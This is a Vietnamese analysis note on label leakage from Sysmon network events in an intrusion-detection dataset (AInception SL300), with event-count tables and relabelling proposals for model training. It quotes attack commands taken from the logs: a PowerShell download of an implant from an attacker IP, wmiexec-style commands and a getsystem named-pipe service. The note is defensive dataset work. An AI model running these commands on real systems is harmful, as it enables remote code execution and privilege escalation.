# AInception SL300 v7: kiểm tra bẫy Sysmon EID 3 trên media — 13/11/2026

Mã: `code/check_eid3_benign.py`. Script đọc thẳng từ `SL300_variant_7.zip` nên không giải nén thêm gì vào DATASET/. Nhãn ngày tấn công lấy từ `output/relabel_v1`.
Output: `output/eid3_check_v1/<máy>/{code_by_day.csv, eid3_records.csv, summary.json}` cho media, apps, dc, hq01, và `output/eid3_check_v1/all_benign_hosts_eid1_eid3.csv` cho 27 máy Windows ở ngày benign.

```bash
cd /mnt/SSD_Data/optc/IL/dataset_2-AInception/code
python3 check_eid3_benign.py --all-benign      # khoảng 1 phút
```

## Kết luận

1. **Bẫy là có thật.** Media không có EID 3 nào trong 42.697 sự kiện ngày benign (29/10 13:50 → 04/11 11:59 UTC; 5 ngày đủ và 2 ngày lẻ). Ngày tấn công có 335 EID 3, và cả 335 đều thuộc tiến trình tấn công. Trên media, chỉ riêng việc có một sự kiện netconn đã cho biết nhãn.
2. **Nguyên nhân là cấu hình Sysmon, không phải hành vi mạng.** EID 3 chỉ được ghi cho một số image: Java, Exchange, Office, mstsc, psexec, powershell, notepad, nmap… Các phần mềm chạy trên media ở ngày benign (GoogleUpdate, svchost, taskhostw…) không có trong danh sách đó nên không bao giờ sinh EID 3. Ngược lại, implant `C:\Temp\wupdate.exe`/`update_2.exe` có kết nối C2 nhưng cũng không có EID 3. Lệnh powershell tải `wupdate.exe` từ `25.18.17.86:81` cũng không có.
3. **Bẫy không chỉ nằm ở EID 3.** Trên media có 557 EID 1 tấn công, và không image nào trong số đó xuất hiện ở ngày benign của media. Nếu xét ngày benign của cả 27 máy Windows thì 551/557 vẫn chưa từng xuất hiện. `powershell.exe`, `notepad.exe` và `nmap.exe` không được khởi chạy lần nào trên 27 máy suốt 6 ngày benign.
4. **Quyết định cho bước 4:** bỏ EID 3 khỏi input của mô hình (vẫn giữ để làm hạt giống khi gán nhãn). Kết quả có EID 3 chỉ báo cáo như một ablation. Chi tiết ở mục 6.
5. **Phát hiện kèm theo:** relabel_v1 bỏ sót initial access qua WMI lúc 08:50:39, `getsystem` lúc 09:12:24, và khoảng 150 sự kiện do kẻ tấn công gây ra nhưng không gắn được với tiến trình (mục 5).

## 1. Media: ngày benign so với ngày tấn công

| Ngày (UTC) | Giai đoạn | Sự kiện | Sysmon | EID 3 |
|---|---|---:|---:|---:|
| 29/10 (từ 13:50) | benign | 2.832 | 63 | 0 |
| 30/10 | benign | 7.331 | 159 | 0 |
| 31/10 | benign | 7.105 | 157 | 0 |
| 01/11 | benign | 7.356 | 158 | 0 |
| 02/11 | benign | 7.290 | 157 | 0 |
| 03/11 | benign | 7.104 | 169 | 0 |
| 04/11 (đến 11:59) | benign | 3.679 | 68 | 0 |
| 04/11 (từ 12:50) | tấn công | 3.232 | 84 | 0 |
| 05/11 (đến 14:29) | tấn công | 7.353 | 1.290 | **335** |

- Hai khoảng thời gian không chồng lên nhau. Bản `labelled_logs/bnhq7/benign/media.ecslogs` có cùng 42.697 dòng với `logs/benign_days/media.ecslogs`.
- Sysmon của media ở ngày benign chỉ có EID 1 (893), EID 22 (22), EID 13 (12) và EID 12 (4).
- EID 3 ở ngày tấn công:
  - notepad.exe 298 (2 tiến trình; tiến trình chính có 297 kết nối từ 12:19 đến 13:59 tới cổng 22/139/445/4448/5000/61616);
  - powershell.exe 36 (1 tiến trình `-EncodedCommand`, 10:07:16–10:08:02, cổng 389/445/3268/4447, khớp với lúc chạy BloodHound);
  - nmap.exe 1 (cổng 53).
  - Mọi bản ghi đều có `RuleName = "-"`. 334/335 là kết nối chiều đi. Chỉ 1 kết nối tới endpoint của kẻ tấn công (25.18.17.86).

## 2. EID 3 ở ngày benign của 27 máy Windows

| Máy | EID 3 ở ngày benign (6 ngày) |
|---|---|
| apps | java.exe 99.013, svchost.exe 6 (ngày tấn công: java.exe 17.858, đều lành) |
| mail | MSExchangeFrontendTransport 4.265, MSExchangeHMWorker 4.265 |
| hq20 | **psexec.exe 28, mstsc.exe 12** (hoạt động quản trị lành) |
| hq01–hq19, trừ hq08 và hq17 | powerpnt.exe / winword.exe, 1–3 sự kiện mỗi máy |
| dc | svchost.exe 2 |
| media, ca, rootca, mailrelay, hq08, hq17 | 0 |

Lấy EID 3 lành từ máy khác làm mẫu âm cũng **không gỡ được bẫy**, vì image khác hẳn: Java, Exchange, Office lành, còn powershell, notepad và nmap thì chỉ có ở tấn công. Mô hình sẽ chuyển sang học theo image.

## 3. Bẫy image (Sysmon EID 1, media)

| Image của tiến trình tấn công | EID 1 | Có ở ngày benign của máy nào không |
|---|---:|---|
| ping.exe | 512 | không |
| vcredist_x86.exe | 8 | không |
| net.exe / net1.exe | 6 / 6 | không |
| cmd.exe | 5 | có (6–20 lần trên mỗi máy hq, 3 trên apps, 1 trên dc) |
| powershell.exe | 4 | **không, trên cả 27 máy** |
| reg.exe, nmap.exe | 3, 3 | không |
| l_test.exe, notepad.exe, winpcap-nmap-4.12.exe | 2, 2, 2 | không |
| wupdate.exe, update_2.exe, appcmd.exe | 1, 1, 1 | không |
| netsh.exe | 1 | có (mail 1.707) |

Có 181 EID 1 mang nhãn lành ở ngày tấn công. Image của 170 sự kiện trong số đó có xuất hiện ở ngày benign của media. 11 sự kiện còn lại gồm cmd ×4, powershell ×1, rundll32 ×2, msiexec, tzsync, TrustedInstaller và defrag. Trong đó cmd ×4 và powershell ×1 thực ra là tiến trình tấn công bị bỏ sót (mục 5). Như vậy, chỉ một luật đơn giản "image chưa từng chạy trên máy này ở ngày benign thì là tấn công" đã đạt recall 1,0 trên EID 1 của media, chỉ sai 6 sự kiện hệ thống. Theo contract `optc_il`, `app_family` chính là tên image, nên bẫy này đi thẳng vào input.

## 4. Các mã sự kiện chỉ xuất hiện ở ngày tấn công (media)

| Mã | Số | y_new = 1 | Nội dung |
|---|---:|---:|---|
| Sysmon 3 | 335 | 335 | NetworkConnect (mục 1) |
| Sysmon 11 | 130 | 111 | FileCreate (cấu hình chỉ ghi một số đường dẫn và đuôi file). 19 sự kiện còn lại: msiexec 16 (cài VC++ đi kèm nmap) và powershell dropper 3 |
| Sysmon 2 / 8 / 6 | 2 / 2 / 1 | 2 / 2 / 0 | timestomp của trình cài winpcap-nmap; CreateRemoteThread từ wupdate/update_2 vào svchost; nạp driver npf.sys |
| PowerShell 400/403/600/800/4103/4104 | 6/5/38/4/4/79 | 0 | engine của dropper lúc 08:50:39, host "MSFConsole", script block `Invoke-BloodHound` lúc 10:07:15 |
| System 7045 + 7009, Security 4697 | 2 + 1, 2 | 0 | service `bspdwe` = `cmd.exe /c echo bspdwe > \\.\pipe\bspdwe` (getsystem, 09:12:24); service npf (11:41) |
| Security 4950 / 4957 | 3 / 8 | 0 | tắt Windows Firewall lúc 12:30:33 |
| Application 1033/1040/1042/11707/10000/10001 | 12 | 0 | MSI cài VC++ 2013 (gói đi kèm nmap) lúc 11:41 |
| Security 4611, 5381; System 10149 | 1, 2, 1 | 0 | đăng ký trusted logon process (09:23), đọc Vault credentials (13:06), WinRM không lắng nghe. Chưa xác minh |

Các mã này đều chỉ có ở ngày tấn công, và gần như tất cả đều do kẻ tấn công gây ra. Tuy vậy, phần lớn đang mang nhãn 0 vì relabel_v1 chỉ lan nhãn theo ProcessGuid. Nếu đưa nguyên vào chuỗi, chúng vừa là nhãn sai (bị coi là lành) vừa là manh mối gần như chắc chắn cho cửa sổ tấn công.

## 5. Nhãn relabel_v1 bỏ sót (phát hiện khi kiểm tra)

1. **Initial access qua WMI, 08:50:39.** Thứ tự sự kiện:
   - 4624 logon type 3 của `servicetech` từ **192.168.2.11** (xe pv1c2, đã có trong `attacker_ips`);
   - `WmiPrvSE.exe` tạo 3 tiến trình `cmd.exe /Q /c … 1> \\127.0.0.1\ADMIN$\__1730796639.05…` (dấu hiệu của wmiexec);
   - `powershell Invoke-WebRequest http://25.18.17.86:81/update_2.exe -OutFile C:\Temp\wupdate.exe`;
   - EID 11 ghi `C:\Temp\wupdate.exe`, rồi khởi chạy file này.

   Chỉ `wupdate.exe` được gán nhãn, nhờ cấu hình seed implant. Hạt giống remote-exec cần một hành động trong attack log, mà chuỗi này diễn ra trước Lore nên không có.
2. **getsystem, 09:12:24.** `services.exe → cmd.exe /c echo bspdwe > \\.\pipe\bspdwe`, kèm 7045/4697/7009, đang mang nhãn 0.
3. **Sự kiện không có ProcessGuid** (mục 4): log PowerShell (4103/4104 có `winlog.process.pid`, có thể dùng để gắn với tiến trình), firewall, MSI, service install.

## 6. Đề xuất xử lý trước khi train (bước 4)

1. **Bỏ Sysmon EID 3 khỏi input** của mọi máy Windows trong SL300. EID 3 vẫn dùng để tìm hạt giống khi gán nhãn. Theo contract `optc_il`, chỉ netconn mới có `proto`/`resp_port_class` khác `<MISSING>`, nên với AInception Windows hai trường này sẽ luôn là `<MISSING>`, tức đây là miền chỉ có sự kiện tiến trình/file. Biến thể có EID 3 chỉ báo cáo như ablation, kèm cảnh báo về bẫy.
   Đã cân nhắc nhưng loại hai phương án:
   - thêm EID 3 lành từ máy khác: không gỡ được bẫy, vì mô hình sẽ học theo image (mục 2);
   - gắn thông tin "tiến trình có kết nối mạng" vào tiến trình: vẫn chỉ có cho các image nằm trong danh sách của cấu hình.
2. **Ablation che `app_family`** (chỉ giữ `image_dir_class` và cấu trúc) để đo xem mô hình dựa vào tên image tới mức nào. Kết quả trên media nên coi là cận trên. hq20 (psexec, mstsc, cmd lành) dùng làm mẫu âm khó.
3. **Sysmon 11/2/6/8 và các mã ở mục 4** đều chỉ có ở ngày tấn công. Sysmon 8 phản ánh hành vi thật (inject), nhưng Sysmon 11 bị cấu hình lọc giống EID 3. Cần quyết định ở bước 4, tốt nhất bằng ablation. Sự kiện không gắn được với tiến trình (src = other, Security không có pid) nên loại khỏi input, hoặc gắn nhãn lại trước.
4. **relabel_v2** (cần user duyệt):
   - hạt giống là logon 4624 từ IP kẻ tấn công, cộng các tiến trình con của WmiPrvSE trong cùng phiên/cùng user trong vài giây;
   - lan nhãn ngược từ implant đã cấu hình sang tiến trình đã ghi file implant (EID 11 + ParentProcessGuid);
   - mẫu getsystem là service có lệnh `echo … > \\.\pipe\…`;
   - gắn 4104/4103 với tiến trình qua pid.
5. Chia train/test theo run/variant (việc 3 của handoff) để kiểm tra lại bẫy image ở một run khác. Nếu mọi run SL300 đều không có powershell lành thì phải nêu rõ đây là giới hạn của bộ dữ liệu.
